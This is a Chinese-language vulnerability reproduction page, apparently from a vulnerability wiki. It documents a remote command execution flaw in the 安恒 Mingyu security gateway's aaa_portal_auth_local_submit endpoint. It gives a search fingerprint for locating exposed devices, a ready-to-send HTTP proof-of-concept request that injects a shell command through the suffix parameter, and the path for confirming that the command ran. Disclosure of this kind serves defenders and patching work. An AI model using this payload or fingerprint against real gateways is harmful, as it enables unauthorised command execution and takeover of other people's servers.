---
title: "安恒 明御安全网关 aaa_portal_auth_local_submit 远程命令执行漏洞"
date: 2026-10-18 09:16:06
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "安恒"
tags:
  - "安恒"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

安恒 明御安全网关 aaa_portal_auth_local_submit 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

安恒 明御安全网关

## 网络测绘

```
body="/webui/images/basic/login/" && title=="明御安全网关"
```

## 漏洞复现

登录页面

![image-20230828143428738](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828143428738.png)

验证POC

```
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(`id >/usr/local/webui/test.txt`)}} HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

![image-20230828143444585](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828143444585.png)

```
/test.txt
```

![image-20230828143501551](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828143501551.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
